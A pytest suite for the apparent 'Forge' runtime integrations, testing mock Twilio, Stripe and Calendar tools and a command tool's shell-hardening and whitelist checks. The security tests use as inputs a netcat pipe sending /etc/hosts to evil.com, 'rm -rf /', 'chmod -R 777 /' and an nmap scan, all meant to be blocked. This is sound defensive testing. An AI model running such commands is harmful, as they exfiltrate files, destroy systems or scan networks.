"""Tests for Forge integration tools — Twilio, Stripe, Calendar, and MockDataStore."""

import json
import pytest
from unittest.mock import patch, MagicMock

from forge.runtime.integrations.twilio_tool import create_twilio_tool, _send_sms
from forge.runtime.integrations.stripe_tool import create_stripe_tool, _stripe_action
from forge.runtime.integrations.calendar_tool import create_calendar_tool, _calendar_action
from forge.runtime.integrations import mock_backends
from forge.runtime.integrations.mock_backends import MockDataStore, create_mock_tool_function


@pytest.fixture(autouse=True)
def _clear_calendar_events():
    """Reset the module-level mock events list between tests."""
    from forge.runtime.integrations.calendar_tool import _mock_events
    _mock_events.clear()
    yield
    _mock_events.clear()


class TestTwilioTool:
    """Tests for Twilio SMS integration."""

    def test_create_tool(self):
        tool = create_twilio_tool()
        assert tool.name == "send_sms"
        assert len(tool.parameters) >= 2

    @pytest.mark.asyncio
    async def test_error_without_mock_mode(self, monkeypatch):
        """Without credentials and without MOCK_MODE, returns an error."""
        monkeypatch.delenv("TWILIO_ACCOUNT_SID", raising=False)
        monkeypatch.delenv("TWILIO_AUTH_TOKEN", raising=False)
        monkeypatch.delenv("MOCK_MODE", raising=False)
        monkeypatch.delenv("MOCK_INTEGRATIONS", raising=False)
        tool = create_twilio_tool()
        result = json.loads(await tool.run(to="+15551234567", body="Hello from Forge"))
        assert result["success"] is False
        assert "MOCK_MODE" in result["error"]

    @pytest.mark.asyncio
    async def test_mock_mode_no_env(self, monkeypatch):
        """Without TWILIO_ACCOUNT_SID but with MOCK_MODE=true, returns mock response."""
        monkeypatch.delenv("TWILIO_ACCOUNT_SID", raising=False)
        monkeypatch.delenv("TWILIO_AUTH_TOKEN", raising=False)
        monkeypatch.setenv("MOCK_MODE", "true")
        tool = create_twilio_tool()
        result = json.loads(await tool.run(to="+15551234567", body="Hello from Forge"))
        assert result["success"] is True
        assert result["mock"] is True
        assert result["to"] == "+15551234567"
        assert "sid" in result

    @pytest.mark.asyncio
    async def test_mock_mode_via_mock_integrations(self, monkeypatch):
        """MOCK_INTEGRATIONS=true also enables mock mode."""
        monkeypatch.delenv("TWILIO_ACCOUNT_SID", raising=False)
        monkeypatch.delenv("TWILIO_AUTH_TOKEN", raising=False)
        monkeypatch.delenv("MOCK_MODE", raising=False)
        monkeypatch.setenv("MOCK_INTEGRATIONS", "true")
        tool = create_twilio_tool()
        result = json.loads(await tool.run(to="+15551234567", body="Hello"))
        assert result["success"] is True
        assert result["mock"] is True

    @pytest.mark.asyncio
    async def test_mock_mode_different_numbers(self, monkeypatch):
        """Different phone numbers produce different mock SIDs."""
        monkeypatch.delenv("TWILIO_ACCOUNT_SID", raising=False)
        monkeypatch.delenv("TWILIO_AUTH_TOKEN", raising=False)
        monkeypatch.setenv("MOCK_MODE", "true")
        tool = create_twilio_tool()
        r1 = json.loads(await tool.run(to="+15551111111", body="msg1"))
        r2 = json.loads(await tool.run(to="+15552222222", body="msg2"))
        assert r1["success"] and r2["success"]

    @pytest.mark.asyncio
    async def test_mock_body_preserved(self, monkeypatch):
        monkeypatch.delenv("TWILIO_ACCOUNT_SID", raising=False)
        monkeypatch.delenv("TWILIO_AUTH_TOKEN", raising=False)
        monkeypatch.setenv("MOCK_MODE", "true")
        tool = create_twilio_tool()
        result = json.loads(await tool.run(to="+1555", body="Important message content"))
        assert result["body"] == "Important message content"


class TestStripeTool:
    """Tests for Stripe payments integration."""

    def test_create_tool(self):
        tool = create_stripe_tool()
        assert tool.name == "stripe_payment"
        param_names = [p.name for p in tool.parameters]
        assert "payment_method_id" in param_names

    @pytest.mark.asyncio
    async def test_error_without_mock_mode(self, monkeypatch):
        """Without credentials and without MOCK_MODE, returns an error."""
        monkeypatch.delenv("STRIPE_API_KEY", raising=False)
        monkeypatch.delenv("MOCK_MODE", raising=False)
        monkeypatch.delenv("MOCK_INTEGRATIONS", raising=False)
        tool = create_stripe_tool()
        result = json.loads(await tool.run(action="charge", amount=5000))
        assert result["success"] is False
        assert "MOCK_MODE" in result["error"]

    @pytest.mark.asyncio
    async def test_mock_charge(self, monkeypatch):
        monkeypatch.delenv("STRIPE_API_KEY", raising=False)
        monkeypatch.setenv("MOCK_MODE", "true")
        tool = create_stripe_tool()
        result = json.loads(await tool.run(action="charge", amount=5000, currency="usd"))
        assert result["success"] is True
        assert result["mock"] is True
        assert result["amount"] == 5000
        assert result["status"] == "succeeded"

    @pytest.mark.asyncio
    async def test_mock_create_customer(self, monkeypatch):
        monkeypatch.delenv("STRIPE_API_KEY", raising=False)
        monkeypatch.setenv("MOCK_MODE", "true")
        tool = create_stripe_tool()
        result = json.loads(await tool.run(action="create_customer", customer_email="test@example.com"))
        assert result["success"] is True
        assert "cus_" in result["id"]

    @pytest.mark.asyncio
    async def test_mock_list_charges(self, monkeypatch):
        monkeypatch.delenv("STRIPE_API_KEY", raising=False)
        monkeypatch.setenv("MOCK_MODE", "true")
        tool = create_stripe_tool()
        result = json.loads(await tool.run(action="list_charges"))
        assert result["success"] is True
        assert len(result["charges"]) > 0

    @pytest.mark.asyncio
    async def test_mock_subscribe(self, monkeypatch):
        monkeypatch.delenv("STRIPE_API_KEY", raising=False)
        monkeypatch.setenv("MOCK_MODE", "true")
        tool = create_stripe_tool()
        result = json.loads(await tool.run(action="subscribe", plan_id="price_123", customer_id="cus_abc"))
        assert result["success"] is True
        assert result["status"] == "active"

    @pytest.mark.asyncio
    async def test_mock_mode_via_mock_integrations(self, monkeypatch):
        """MOCK_INTEGRATIONS=true also enables mock mode."""
        monkeypatch.delenv("STRIPE_API_KEY", raising=False)
        monkeypatch.delenv("MOCK_MODE", raising=False)
        monkeypatch.setenv("MOCK_INTEGRATIONS", "true")
        tool = create_stripe_tool()
        result = json.loads(await tool.run(action="charge", amount=1000))
        assert result["success"] is True
        assert result["mock"] is True

    @pytest.mark.asyncio
    async def test_unknown_action(self, monkeypatch):
        monkeypatch.delenv("STRIPE_API_KEY", raising=False)
        monkeypatch.setenv("MOCK_MODE", "true")
        tool = create_stripe_tool()
        result = json.loads(await tool.run(action="refund_everything"))
        assert result["success"] is False
        assert "Unknown" in result["error"]


class TestCalendarTool:
    """Tests for Google Calendar integration."""

    def test_create_tool(self):
        tool = create_calendar_tool()
        assert tool.name == "calendar"

    @pytest.mark.asyncio
    async def test_error_without_mock_mode(self, monkeypatch):
        """Without credentials and without MOCK_MODE, returns an error."""
        monkeypatch.delenv("GOOGLE_CALENDAR_API_KEY", raising=False)
        monkeypatch.delenv("MOCK_MODE", raising=False)
        monkeypatch.delenv("MOCK_INTEGRATIONS", raising=False)
        tool = create_calendar_tool()
        result = json.loads(await tool.run(action="list_events"))
        assert result["success"] is False
        assert "MOCK_MODE" in result["error"]

    @pytest.mark.asyncio
    async def test_mock_create_event(self, monkeypatch):
        monkeypatch.delenv("GOOGLE_CALENDAR_API_KEY", raising=False)
        monkeypatch.setenv("MOCK_MODE", "true")
        tool = create_calendar_tool()
        result = json.loads(await tool.run(
            action="create_event", title="Team Standup",
            date="2025-01-15", time="09:00", duration_minutes=30
        ))
        assert result["success"] is True
        assert result["event"]["title"] == "Team Standup"
        assert "evt_" in result["event"]["id"]

    @pytest.mark.asyncio
    async def test_mock_list_events(self, monkeypatch):
        monkeypatch.delenv("GOOGLE_CALENDAR_API_KEY", raising=False)
        monkeypatch.setenv("MOCK_MODE", "true")
        tool = create_calendar_tool()
        result = json.loads(await tool.run(action="list_events"))
        assert result["success"] is True
        assert isinstance(result["events"], list)

    @pytest.mark.asyncio
    async def test_mock_check_availability(self, monkeypatch):
        monkeypatch.delenv("GOOGLE_CALENDAR_API_KEY", raising=False)
        monkeypatch.setenv("MOCK_MODE", "true")
        tool = create_calendar_tool()
        result = json.loads(await tool.run(action="check_availability", date="2025-01-15"))
        assert result["success"] is True
        assert "available_slots" in result
        assert len(result["available_slots"]) > 0

    @pytest.mark.asyncio
    async def test_mock_delete_nonexistent(self, monkeypatch):
        monkeypatch.delenv("GOOGLE_CALENDAR_API_KEY", raising=False)
        monkeypatch.setenv("MOCK_MODE", "true")
        tool = create_calendar_tool()
        result = json.loads(await tool.run(action="delete_event", event_id="nonexistent"))
        assert result["success"] is False

    @pytest.mark.asyncio
    async def test_unknown_action(self, monkeypatch):
        monkeypatch.delenv("GOOGLE_CALENDAR_API_KEY", raising=False)
        monkeypatch.setenv("MOCK_MODE", "true")
        tool = create_calendar_tool()
        result = json.loads(await tool.run(action="teleport"))
        assert result["success"] is False


class TestMockDataStore:
    """Tests for MockDataStore seed data backend."""

    def test_seed_data_loaded(self):
        store = MockDataStore()
        customers = store.query("customers")
        assert len(customers) >= 10

    def test_query_with_filter(self):
        store = MockDataStore()
        active = store.query("customers", {"status": "active"})
        assert all(c["status"] == "active" for c in active)

    def test_get_by_id(self):
        store = MockDataStore()
        customer = store.get_by_id("customers", "cust_0000")
        assert customer is not None
        assert customer["id"] == "cust_0000"

    def test_get_by_id_not_found(self):
        store = MockDataStore()
        assert store.get_by_id("customers", "nonexistent") is None

    def test_create_record(self):
        store = MockDataStore()
        record = store.create("customers", {"name": "New Customer", "email": "new@test.com"})
        assert "id" in record
        assert record["name"] == "New Customer"
        found = store.get_by_id("customers", record["id"])
        assert found is not None

    def test_update_record(self):
        store = MockDataStore()
        updated = store.update("customers", "cust_0000", {"plan": "enterprise"})
        assert updated is not None
        assert updated["plan"] == "enterprise"

    def test_delete_record(self):
        store = MockDataStore()
        initial_count = len(store.query("customers"))
        deleted = store.delete("customers", "cust_0000")
        assert deleted is True
        assert len(store.query("customers")) == initial_count - 1

    def test_delete_nonexistent(self):
        store = MockDataStore()
        assert store.delete("customers", "nonexistent") is False

    def test_appointments_seeded(self):
        store = MockDataStore()
        appointments = store.query("appointments")
        assert len(appointments) > 0

    def test_tickets_seeded(self):
        store = MockDataStore()
        tickets = store.query("tickets")
        assert len(tickets) > 0

    def test_products_seeded(self):
        store = MockDataStore()
        products = store.query("products")
        assert len(products) > 0

    def test_empty_collection(self):
        store = MockDataStore()
        result = store.query("nonexistent_collection")
        assert result == []


class TestMockToolFunction:
    """Tests for create_mock_tool_function factory."""

    @pytest.mark.asyncio
    async def test_schedule_appointment(self):
        fn = create_mock_tool_function("schedule_appointment", "Schedule an appointment", [])
        result = json.loads(await fn(customer_id="cust_0001", date="2025-03-15", time="10:00"))
        assert result["success"] is True

    @pytest.mark.asyncio
    async def test_lookup_customer(self):
        fn = create_mock_tool_function("lookup_customer", "Look up customer", [])
        result = json.loads(await fn())
        assert result["success"] is True
        assert result["count"] > 0

    @pytest.mark.asyncio
    async def test_create_ticket(self):
        fn = create_mock_tool_function("create_support_ticket", "Create ticket", [])
        result = json.loads(await fn(subject="Help needed", priority="high"))
        assert result["success"] is True

    @pytest.mark.asyncio
    async def test_list_orders(self):
        fn = create_mock_tool_function("list_orders", "List orders", [])
        result = json.loads(await fn())
        assert result["success"] is True
        assert "results" in result


class TestCommandToolShellHardening:
    """Tests for shell execution hardening in command_tool."""

    def test_needs_shell_detects_operators(self):
        from forge.runtime.integrations.command_tool import _needs_shell
        assert _needs_shell("ls | grep foo") is True
        assert _needs_shell("echo hello && echo world") is True
        assert _needs_shell("cat file > output.txt") is True
        assert _needs_shell("echo $(whoami)") is True
        assert _needs_shell("cmd1 || cmd2") is True
        assert _needs_shell("cmd1 ; cmd2") is True

    def test_needs_shell_false_for_simple_commands(self):
        from forge.runtime.integrations.command_tool import _needs_shell
        assert _needs_shell("python test.py") is False
        assert _needs_shell("pip install flask") is False
        assert _needs_shell("git status") is False

    @pytest.mark.asyncio
    async def test_simple_command_uses_shell_false(self):
        """Simple command without shell operators should use shell=False."""
        from forge.runtime.integrations.command_tool import run_command
        with patch("forge.runtime.integrations.command_tool.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="ok", stderr="")
            await run_command("python test.py", workdir=".")
            call_kwargs = mock_run.call_args
            assert call_kwargs[1]["shell"] is False
            # First arg should be a list (shlex.split result)
            assert isinstance(call_kwargs[0][0], list)

    @pytest.mark.asyncio
    async def test_piped_command_uses_shell_true(self):
        """Command with pipe operator should use shell=True."""
        from forge.runtime.integrations.command_tool import run_command
        with patch("forge.runtime.integrations.command_tool.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="ok", stderr="")
            await run_command("pytest | tee output.log", workdir=".")
            call_kwargs = mock_run.call_args
            assert call_kwargs[1]["shell"] is True
            # First arg should be a string when shell=True
            assert isinstance(call_kwargs[0][0], str)


class TestCommandWhitelistSecurity:
    """Tests for whitelist-based command validation."""

    def test_allowed_command_passes(self):
        from forge.runtime.integrations.command_tool import _check_command_whitelist
        ok, _ = _check_command_whitelist("python test.py")
        assert ok
        ok, _ = _check_command_whitelist("git status")
        assert ok
        ok, _ = _check_command_whitelist("pip install flask")
        assert ok

    def test_disallowed_command_rejected(self):
        from forge.runtime.integrations.command_tool import _check_command_whitelist
        ok, reason = _check_command_whitelist("nmap -sS 192.168.1.0/24")
        assert not ok
        assert "nmap" in reason

    def test_pipeline_all_allowed(self):
        from forge.runtime.integrations.command_tool import _check_command_whitelist
        ok, _ = _check_command_whitelist("grep foo bar.txt | sort | uniq")
        assert ok

    def test_pipeline_one_disallowed(self):
        from forge.runtime.integrations.command_tool import _check_command_whitelist
        ok, reason = _check_command_whitelist("cat /etc/hosts | nc evil.com 1234")
        assert not ok
        assert "nc" in reason

    def test_whitelist_disabled_via_env(self, monkeypatch):
        from forge.runtime.integrations.command_tool import _check_command_whitelist
        monkeypatch.setenv("FORGE_COMMAND_WHITELIST_DISABLED", "1")
        ok, _ = _check_command_whitelist("nmap -sS 192.168.1.0/24")
        assert ok

    def test_extract_base_command_strips_path(self):
        from forge.runtime.integrations.command_tool import _extract_base_command
        assert _extract_base_command("/usr/bin/python3 script.py") == "python3"
        assert _extract_base_command("python test.py") == "python"

    def test_extract_base_command_strips_extension(self):
        from forge.runtime.integrations.command_tool import _extract_base_command
        assert _extract_base_command("python.exe test.py") == "python"

    def test_extract_base_command_handles_env_vars(self):
        from forge.runtime.integrations.command_tool import _extract_base_command
        assert _extract_base_command("FOO=bar python script.py") == "python"

    def test_denylist_case_insensitive(self):
        from forge.runtime.integrations.command_tool import _is_command_safe
        # "RM -RF /" should be caught even in uppercase (matched against lowered input)
        ok, reason = _is_command_safe("RM -RF /")
        assert not ok
        assert "rm -rf /" in reason.lower()

    def test_denylist_chmod_case_insensitive(self):
        from forge.runtime.integrations.command_tool import _is_command_safe
        ok, _ = _is_command_safe("chmod -R 777 /")
        assert not ok

    @pytest.mark.asyncio
    async def test_blocked_command_returns_blocked_json(self):
        from forge.runtime.integrations.command_tool import run_command
        result = json.loads(await run_command("nmap 192.168.1.1"))
        assert result["blocked"] is True
        assert "whitelist" in result["stderr"]

    def test_parse_command_returns_list(self):
        from forge.runtime.integrations.command_tool import _parse_command
        result = _parse_command("python -m pytest tests/")
        assert isinstance(result, list)
        assert result[0] == "python"

    def test_is_whitelist_enabled_default(self):
        from forge.runtime.integrations.command_tool import _is_whitelist_enabled
        assert _is_whitelist_enabled() is True
